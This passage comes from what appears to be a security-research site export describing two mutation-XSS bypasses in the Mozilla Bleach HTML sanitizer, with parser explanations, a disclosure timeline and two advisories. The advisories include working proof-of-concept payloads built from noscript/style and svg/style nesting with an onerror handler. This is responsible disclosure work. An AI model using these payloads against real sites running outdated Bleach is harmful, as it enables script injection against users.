standard browser interprets invalid HTML. When we enter the data below into the innerHTML of the page:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-1.png\" style=\"width: 100%;\"/>\n\nThe browser will modify the data to make it valid html. In this case, this is what the output looks like:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-2.png\" style=\"width: 100%;\"/>\n\nNow let’s try to change the **div** tag to a different type of tag, for example:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-3.png\" style=\"width: 100%;\"/>\n\nDoing so will generate the result below:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-4.png\" style=\"width: 100%;\"/>\n\nBoth examples act differently because the data inside the tags are parsed differently according to the tag type. Now, imagine the parser goes from left to right. In the first case, after entering the ***div*** tag, the parser stays as html and opens an ***a*** tag with the title attribute (because the “closing” ***div*** tag is text in an attribute, it will not close the tag). In the second case, when the parser enters the ***style*** tag, it changes to CSS parser, which means no ***a*** tag is created, and the ***style*** tag will be closed where the attribute was supposed to be. So, how can this information help us in finding vulnerabilities? Imagine a tag that parses differently in different cases, for example, the ***noscript*** tag. The trick here is that the ***noscript*** tag in HTML is treated differently, whether JavaScript (JS) is enabled or disabled. When JS is enabled, the data inside the tag is parsed as JS. But, when it’s disabled, the data is parsed as html. In nearly all cases, JS is enabled in browsers. Let’s take a look at how the following input is being interpreted with, and without, JS enabled:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-5.png\" style=\"width: 100%;\"/>\n\nHere, JS is disabled:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-6.png\" style=\"width: 100%;\"/>\n\nHere, JS is enabled:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-7.png\" style=\"width: 100%;\"/>\n\n# Vulnerability: CVE-2020-6802\n\nWhen we tried to pass the above input to Bleach, it sanitized the '***<***' characters in the attribute, but also it closed the ***a*** tag! This means that it parsed the data in ***noscript*** as html.\n\n<img src=\"/img/blogs/mozilla-bleach/Image-8.png\" style=\"width: 100%;\"/>\n\nIn this case, the only thing left is to avoid this sanitization. If that wasn’t enough of a challenge, we attempted to enter another parsing into the equation.\n\n<img src=\"/img/blogs/mozilla-bleach/Image-9.png\" style=\"width: 100%;\"/>\n\nThis provided the outcome we were anticipating. **Sanitizer view**: Enters ***noscript*** and the parser is **HTML**, opens a ***style*** tag, and starts parsing as CSS (or raw text). Everything after the ***style*** tag isn’t parsed as html, so from the sanitizer’s viewpoint, there is no closing ***noscript*** tag nor ***img*** tag. **Browser view**: Enters ***noscript*** and the parser is changed to JavaScript. Now the ***\"&lt;style>\"*** is just text, not a tag. As you can see, the closing tag, in this case, actually closes the ***noscript*** tag, and from there, everything is html. The conditions to successful exploitation are: ***noscript*** tag allowed as well as html comments, or one of the following tags: ***title, textarea, script, style, noembed, noframes, iframe, xmp***.\n\n# Vulnerability: CVE-2020-6816\n\nShortly after, the Checkmarx Security Research Team discovered another mXSS vulnerability in Mozilla-Bleach, this time with the use of ***svg/math*** tags. The caveat here is that the parsing inside those tags is like XML. So, if we enter, for example, a ***style*** tag, the data inside will act differently, whether inside or outside. Inside an ***svg*** tag:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-10.png\" style=\"width: 40%;\"/>\n\nWithout an ***svg*** tag:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-11.png\" style=\"width: 100%;\"/>\n\nThis shows how differently the data inside the ***style*** tag is being parsed. In addition, some unwanted tags inside the ***svg/math*** will automatically pop out of the ***svg/math*** and will be parsed as HTML (e.g., ***&lt;img>***). When the team tried to put a malicious img tag in ***svg/math->style->img***, Bleach acted strangely. In case the ***img*** tag was whitelisted, it parsed it like the browser and sanitized unwanted attributes as expected. And when the **“strip”** variable was set to true (meaning it will delete unwanted data instead of sanitizing it, default is false), it got deleted. But in case **“strip”** was not changed, we could use any tag that wasn’t allowed and bypass Bleach.\n\n<img src=\"/img/blogs/mozilla-bleach/Image-11.png\" style=\"width: 100%;\"/>\n\nAfter further investigation, we saw that html5lib (the parser behind Bleach) does recognize the data inside ***svg->style*** as tags. But for some reason, Bleach doesn’t sanitize unwanted tags.\n\n# Impact\nAccording to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.\n\n# Summary of Disclosure and Events\nWhen the first vulnerability was discovered, our research team ensured that they could reproduce the process of exploiting it. Once that was confirmed, the Checkmarx team responsibly notified Mozilla of their findings. Subsequently, they opened a Bugzilla ticket where the team helped Mozilla find a proper mitigation approach, and they fixed the issue rapidly. Soon after that, the second vulnerability was discovered by the research team. Again, a responsible notification was sent to Mozilla, and a Bugzilla ticket was quickly opened and resolved. Checkmarx customers using CxSCA were automatically notified to update Mozilla-Bleach.\n\n# Bugzilla Tickets\n* CVE-2020-6802 - https://bugzilla.mozilla.org/show_bug.cgi?id=1615315 \n* CVE-2020-6816 - https://bugzilla.mozilla.org/show_bug.cgi?id=1621692\n\n# Timeline of Disclosure\n| Date    | Action |\n| -------- | ------- |\n| 13-Feb-2020 | First vulnerability reported |\n| 14-Feb-2020 | Checkmarx customers who were using Bleach were warned, without exposing the vulnerability's details |\n| 19-Feb-2020 | Fixed version v3.1.1 and an advisory on GitHub was released |\n| 25-Feb-2020 | CVE-2020-6802 was assigned |\n| 11-Mar-2020 | Second vulnerability reported |\n| 11-Mar-2020 | Checkmarx customers who were using Bleach were warned, without exposing the vulnerability's details |\n| 17-Mar-2020 | Fixed version v3.1.2 and an advisory on GitHub was released |\n| 19-Mar-2020 | CVE-2020-6816 was assigned |\n\n# Final Words\nDiscovering vulnerabilities like the ones documented in this report is why the Checkmarx Security Research Team performs investigations into open source packages. With open source making up the vast majority of today’s commercial software projects, security vulnerabilities must be taken seriously and handled more carefully across the industry. Solutions like CxSCA are essential in helping organizations identify, prioritize, and remediate open source vulnerabilities more efficiently to improve their overall software security risk posture.\n\n# References\n* [XSS](https://owasp.org/www-community/attacks/xss/) \n* [mXSS](https://cure53.de/fp170.pdf)\n* [CVE-2020-6802 advisory](https://github.com/mozilla/bleach/security/advisories/GHSA-q65m-pv3f-wr5r)\n* [CVE-2020-6816 advisory](https://github.com/mozilla/bleach/security/advisories/GHSA-m6xf-fq7q-8743)\n* [CVE-2020-6802 Bugzilla ticket](https://bugzilla.mozilla.org/show_bug.cgi?id=1615315) \n* [CVE-2020-6816 Bugzilla ticket](https://bugzilla.mozilla.org/show_bug.cgi?id=1621692) ","tags":["python","mozilla","xss","mxss"]},{"title":"Mutation XSS in Mozilla-bleach via svg or math","url":"/2020/03/16/Mutation XSS in Mozilla-bleach via svg or math/","content":"## Summary\nMutation XSS (mXSS) vulnerability in Mozilla-bleach , when RCDATA and either svg or math tags are whitelisted and the keyword argument `strip=False`. It happens due to improper sanitization of the RCDATA tags (`script, noscript, style, noframes, xmp, noembed` and `iframe`) when placed under `svg` or `math`, allowing the browser to execute arbitrary HTML in RCDATA on the victim's browser.\n\n## Product\nBleach before 3.1.2\n\n## Impact\nAccording to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.\n\n## Steps to reproduce\n```\n>>> import bleach\n>>> bleach.clean('<svg><style><img src=x onerror=alert(1)>', tags=[\"svg\",\"style\"])\n```\n\n### Expected result:\n```<svg><style><img src=x onerror=alert(1)></style></svg>```\n\n## Remediation\nUpdate bleach dependency to 3.1.2 and above\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Blog](https://www.checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach)\n2. [Advisory](https://github.com/mozilla/bleach/security/advisories/GHSA-m6xf-fq7q-8743)\n3. Commit [175f677](https://github.com/mozilla/bleach/commit/175f67740e7951e1d80cefb7831e6c3e4efeb986)\n","tags":["python","mozilla","xss","mxss"]},{"title":"Mutation XSS in Mozilla-bleach via noscript","url":"/2020/02/24/Mutation XSS in Mozilla-bleach via noscript/","content":"## Summary\nMutation XSS (mXSS) vulnerability in Mozilla-bleach when `noscript` tag is allowed in addition to one of the following tags: `title, textarea, script, style, noembed, noframes, iframe, xmp or comment`. \n\nThis occurs due to bleach utilizing its parser, html5lib, with `scripting=False`. In this case, the data of the noscript tags will be parsed as HTML, while the browser parses them as rawdata. \nThis can cause arbitrary HTML and JavaScript codes to run on the victim's browser.\n\n## Product\nBleach before 3.1.1\n\n## Impact\nAccording to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.\n\n## Steps to reproduce\n```\n>>> import bleach\n>>> bleach.clean('<noscript><style></noscript><img src=x onerror=alert(1)>', tags=[\"noscript\",\"style\"])\n```\n\n### Expected result:\n```<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>```\n\n## Remediation\nUpdate bleach dependency to 3.1.1 and above\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Blog](https://www.checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach)\n2. [Advisory](https://github.com/mozilla/bleach/security/advisories/GHSA-q65m-pv3f-wr5r)\n3. Commit [f77e0f6](https://github.com/mozilla/bleach/commit/f77e0f6392177a06e46a49abd61a4d9f035e57fd)\n","tags":["python","mozilla","xss","mxss"]}]